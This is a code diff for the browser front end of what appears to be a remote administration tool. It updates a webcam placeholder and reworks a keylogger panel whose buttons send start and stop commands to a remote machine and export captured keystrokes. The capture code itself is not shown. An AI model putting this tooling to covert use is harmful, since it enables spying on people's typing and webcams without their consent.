@@ -82,7 +82,7 @@ function handleResponse(data) {
                     previousObjectUrl = null;
                 }
             }
-            if(ph) { ph.style.display = 'flex'; ph.innerHTML = '<i class="fas fa-video-slash fa-2x mb-2 text-slate-400"></i><br>Webcam đang tắt'; }
+            if(ph) { ph.style.display = 'flex'; ph.innerHTML = '<div id="webcam-placeholder" class="text-gray-500 dark:text-slate-500 flex flex-col items-center z-0 w-full h-full relative"><div class="box-of-star1"><div class="star star-position1"></div><div class="star star-position2"></div><div class="star star-position3"></div><div class="star star-position4"></div><div class="star star-position5"></div><div class="star star-position6"></div><div class="star star-position7"></div></div><div class="box-of-star2"><div class="star star-position1"></div><div class="star star-position2"></div><div class="star star-position3"></div><div class="star star-position4"></div><div class="star star-position5"></div><div class="star star-position6"></div><div class="star star-position7"></div></div><div class="box-of-star3"><div class="star star-position1"></div><div class="star star-position2"></div><div class="star star-position3"></div><div class="star star-position4"></div><div class="star star-position5"></div><div class="star star-position6"></div><div class="star star-position7"></div></div><div class="box-of-star4"><div class="star star-position1"></div><div class="star star-position2"></div><div class="star star-position3"></div><div class="star star-position4"></div><div class="star star-position5"></div><div class="star star-position6"></div><div class="star star-position7"></div></div><div data-js="astro" class="astronaut"><div class="head"></div><div class="arm arm-left"></div><div class="arm arm-right"></div><div class="body"><div class="panel"></div></div><div class="leg leg-left"></div><div class="leg leg-right"></div><div class="schoolbag"></div></div><div id="webcam-status-msg" class="absolute bottom-10 left-0 right-0 text-center z-30"><p class="text-slate-400 text-sm font-medium bg-slate-900/50 inline-block px-4 py-2 rounded-full backdrop-blur-sm border border-slate-700">Waiting for connection...</p></div></div>'; }
             if(stats) stats.style.display = 'none';
             state.webcam.currentFPS = 0;
         }
@@ -591,41 +591,78 @@ function attachViewListeners(view) {
         }
     }
     else if (view === 'keylogger') {
-        // Nút Bắt đầu/Dừng/Xóa giữ nguyên logic gửi lệnh
+        const statusText = document.getElementById('keylogger-status');
+        const statusDot = document.getElementById('keylog-status-dot');
+        const modeSelect = document.getElementById('keylog-mode');
+        const modeBadge = document.getElementById('mode-badge');
+
+        // Nút Start
         document.getElementById('start-keylogger-btn').onclick = () => {
             sendCommand('keylogger_start');
-            document.getElementById('keylogger-status').textContent = "Trạng thái: Đang Ghi...";
-            document.getElementById('keylogger-status').className = "text-xs font-bold text-green-600 animate-pulse px-2";
+            
+            // UI Update: Active
+            if(statusText) {
+                statusText.textContent = "Recording keystrokes...";
+                statusText.className = "text-xs text-green-600 dark:text-green-400 font-bold animate-pulse";
+            }
+            if(statusDot) {
+                statusDot.className = "w-1.5 h-1.5 rounded-full bg-green-500 shadow-[0_0_8px_rgba(34,197,94,0.8)] animate-pulse";
+            }
         };
+
+        // Nút Stop
         document.getElementById('stop-keylogger-btn').onclick = () => {
             sendCommand('keylogger_stop');
-            document.getElementById('keylogger-status').textContent = "Trạng thái: Đã dừng.";
-            document.getElementById('keylogger-status').className = "text-xs font-bold text-red-600 px-2";
+            
+            // UI Update: Inactive
+            if(statusText) {
+                statusText.textContent = "Monitoring paused";
+                statusText.className = "text-xs text-slate-500 dark:text-slate-400 font-medium";
+            }
+            if(statusDot) {
+                statusDot.className = "w-1.5 h-1.5 rounded-full bg-red-500";
+            }
         };
+
+        // Nút Clear
         document.getElementById('clear-keylogger-btn').onclick = () => {
-            document.getElementById('keylogger-log-raw').value = '';
-            document.getElementById('keylogger-log-processed').value = '';
+            const raw = document.getElementById('keylogger-log-raw');
+            const proc = document.getElementById('keylogger-log-processed');
+            if(raw) raw.value = '';
+            if(proc) proc.value = '';
             state.keylogger.rawBuffer = "";
             state.keylogger.processedBuffer = "";
         };
 
-        // --- LOGIC MỚI: Đổi chế độ gõ ---
-        document.getElementById('keylog-mode').addEventListener('change', (e) => {
-            state.keylogger.mode = e.target.value;
-            document.getElementById('mode-indicator').textContent = e.target.value === 'telex' ? 'VN' : 'EN';
-            // Lưu ý: Việc đổi chế độ không làm thay đổi văn bản ĐÃ gõ, chỉ áp dụng cho ký tự TIẾP THEO.
-        });
+        // Logic đổi chế độ gõ (Update Badge hiển thị)
+        if (modeSelect) {
+            // Set giá trị mặc định từ state
+            modeSelect.value = state.keylogger.mode || 'english';
+            
+            modeSelect.addEventListener('change', (e) => {
+                state.keylogger.mode = e.target.value;
+                if(modeBadge) {
+                    modeBadge.textContent = e.target.value === 'telex' ? 'VIETNAMESE' : 'ENGLISH';
+                }
+            });
+        }
 
-        // --- LOGIC MỚI: Tải về ---
+        // Logic Tải về
         document.getElementById('download-keylog-btn').onclick = () => {
             const text = state.keylogger.processedBuffer;
-            if (!text) { alert("Chưa có nội dung để tải!"); return; }
+            if (!text) { 
+                Utils.showModal("Thông báo", "Chưa có dữ liệu để xuất file!", null, true);
+                return; 
+            }
             
             const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
-            a.download = `Keylog_${new Date().toISOString().slice(0,19).replace(/[:T]/g,"-")}.txt`;
+            // Tên file: Keylog_HH-mm-ss.txt
+            const now = new Date();
+            const timeStr = `${now.getHours()}h${now.getMinutes()}m`;
+            a.download = `Keylog_Export_${timeStr}.txt`;
             a.click();
             URL.revokeObjectURL(url);
         };
